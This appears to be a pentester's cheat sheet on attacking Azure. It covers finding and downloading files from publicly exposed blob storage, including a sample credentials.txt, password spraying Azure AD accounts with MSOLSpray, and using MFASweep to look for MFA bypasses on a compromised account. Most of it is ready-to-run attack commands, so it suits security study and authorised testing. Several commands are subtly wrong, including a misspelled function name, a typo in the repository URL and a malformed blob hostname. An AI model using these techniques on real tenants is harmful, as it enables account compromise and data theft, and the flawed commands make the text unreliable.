# Cloud exploitation

## Table of contents

##### ➤ AZURE CSP

Public enumeration

* [1. Enumerate storage account](#enumerate-storage-account)

Password attacks

* [1. Guessing Azure AD credentials using MSOLSpray](#Guessing-Azure-AD-credentials-using-MSOLSpray)
* [2. Identify conditional access policy bypass using MFASweep](#Identify-conditional-access-policy-bypass-using-MFASweep)


##### ➤ AWS CSP



#
# ⭕ Azure CSP - Public enumeration


## 🔻Enumerate storage account

A storage account is way of hadnling data in the cloud and are compose to the following sub-services :

| sub-services | Description | DNS records |
| :---: | --- | --- |
| Blob service | General HTTP/HTTPS file hosting | xxx.blob.core.windows.net |
| File service | Attached data storage (SMB/NFS) | xxx.file.core.windows.net |
| Table service | NoSQL semi-strctured datasets | xxx.table.core.windows.net |
| Queue service | HTTP/HTTPS message storage | xxx.queue.core.windows.net |


##### Blob storage

The blob storage is a containers/folders that can be used to store data/object and can be accssed through HTTP/HTTPS endpoint. The URL address is a combination of the storage account name, the conatiner and the object name
```
#Storage account name : kiosecstorage
#Container name : public
#File : readme.txt

https://kiosecstorage.blob;core.windows.net/public/readme.txt
```

The containers can have different public access level configuration :
- **Private** : Does not allow anonymous access. Access needs to be authenticated.
- **Blob** : Allow anonymous access to a know object (file into the container). In this case, an attacker needs to know the full filenames (IDOR attack requiered or fuzzing)
- **Container/Public** : Allows the container file to be listed and accessed anonymously.

***Important note :*** The storage account have also a public access level. If the container public access is public but the storage account have a non-public access, the container cannot be accessed anonymously.

#####  ➤  Detect file in container having "blob" public access level

```
gobuster dir -u https://kiosecstorage.blob.core.windows.net/public/ -w /usr/share/wordlists/dirb/big.txt -t 30 -e -k -x .html,.php,.asp,.aspx,.htm,.xml,.json,.jsp,.pl,.txt,.docs,.docx,.yaml
```

#####  ➤  Identify misconfigured blob containers using MicroBurst (Powershell)

```
# Import module
Import-Module .\MicroBurst.psm1

# Detect storage misconfigured with the specific storage account name kiosecstorage
Invoke-EnumerateAzure Blobs -Base kiosecstorage

# Detect storage misconfigured with custom container list (customcontainer.txt) and storage account name (kiosecstorage)
Invoke-EnumerateAzure Blobs -Base kiosecstorage -Folders .\customcontainer.txt

# Download the contents of the objects detected (ex: credentials.txt)
Invoke-WebRequest -Uri "https://kiosecstorage.blob.core.windows.net/public/credentials.txt" --OutFile "credentials.txt"
```

#####  ➤  Read container having "container/public" public access level

Add "/?restype=container&comp=list"

```
https://kiosecstorage.blob.core.windows.net/public/?restype=container&comp=list
```



#
# ⭕ Azure CSP - Password attacks


## 🔻Guessing Azure AD credentials using MSOLSpray

MSOLSpray takes a list of user and account a list of password and try them against the Azure authentication portal. 

##### Install MSOLSpray
```
git clone https://github.com/dafthack/MSOLSpray.git
```

##### Execute MSOLSpray
```
cd .\MSOLSpray\
Import-Module .\MSOLSpray.ps1

Invoke-MSOLSray -UserList .\userlist.txt -Password myweakpassword123 
```


## 🔻Identify conditional access policy bypass using MFASweep

MFASweep allows to detect the conditional access policy bypasses against a compromised user accounts.

##### Install MFASweep
```
git clone https://github.com/dafhazck/MFASweep.git
```

##### Execute MFASweep
```
cd .\MFASweep\
Import-Module .\MFASweep.ps1

Invoke-MFASweep -Username kiosec@myazurelab.com -Password myweakpassword123
```


